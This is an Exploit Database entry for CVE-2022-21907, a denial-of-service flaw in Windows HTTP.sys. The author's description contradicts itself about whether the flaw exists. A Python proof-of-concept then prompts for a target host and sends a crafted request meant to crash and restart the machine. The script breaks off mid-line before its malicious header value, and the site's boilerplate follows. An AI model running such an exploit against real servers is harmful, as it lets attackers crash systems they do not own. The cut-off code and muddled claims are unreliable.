## Title: Windows 10 v21H1 - HTTP Protocol Stack Remote Code Execution
## Author: nu11secur1ty
## Date: 01.14.2022
## Vendor: https://www.microsoft.com/
## Software: https://www.microsoft.com/en-us/download/details.aspx?id=48264
## Reference: https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2022-21907
## CVE-2022-21907

## Description:
NOTE: After a couple of hours of tests and experiments, I found that
there have been no vulnerabilities, this is just a ridiculous
experiment of Microsoft. When I decided to install the IIS packages on
these Windows platforms, everything was ok, and everything is patched!
Windows Server 2019, Windows 10 version 1809 - 2018 year are not
vulnerable by default, but after I decided to upgrade from 1909 to
2004. I found a serious problem! The Windows 10 version 2004 - 2020
year is still vulnerable to the HTTP Protocol Stack (HTTP.sys). Attack
method: buffer overflow - deny of service and restart the system. This
problem exists, from last year which is reported on CVE-2021-31166,
and still there! On that days I have worked on it again with the help
and collaboration of Axel Souchet 0vercl0k the author of the idea. On
that day, I wrote an only one-line command to exploit this
vulnerability!

[+]Exploit:
```python
#!/usr/bin/python
# Author @nu11secur1ty
# CVE-2022-21907

from colorama import init, Fore, Back, Style
init(convert=True)
import requests
import time

print(Fore.RED +"Please input your host...\n")
print(Style.RESET_ALL)

print(Fore.YELLOW)
host = input()
print(Style.RESET_ALL)

print(Fore.BLUE +"Sending of especially malicious crafted packages,
please wait...")
print(Style.RESET_ALL)
time.sleep(17)

print(Fore.GREEN)
# The PoC :)
poc = requests.get(f'http://{host}/', headers = {'Accept-Encoding':

##### About The Exploit Database

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/?utm_source=edb&utm_medium=web&utm_campaign=www), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subj...
